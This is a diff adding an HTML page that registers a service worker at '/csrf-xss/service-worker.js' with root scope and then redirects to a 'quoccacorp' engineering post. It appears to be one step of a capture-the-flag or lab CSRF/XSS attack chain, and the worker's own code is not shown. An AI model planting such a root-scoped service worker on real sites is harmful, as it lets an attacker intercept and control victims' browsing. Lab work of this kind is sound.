@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>Registering Service Worker...</h1>
+    <script>
+      navigator.serviceWorker.register('/csrf-xss/service-worker.js', { scope: '/' })
+        .then(() => {
+          alert('Service Worker registered! Now redirecting...');
+          location.href = 'https://engineering.quoccacorp.com/posts/YOUR-POST-ID';
+        })
+        .catch(err => alert('Failed to register: ' + err));
+    </script>
+  </body>
+</html>
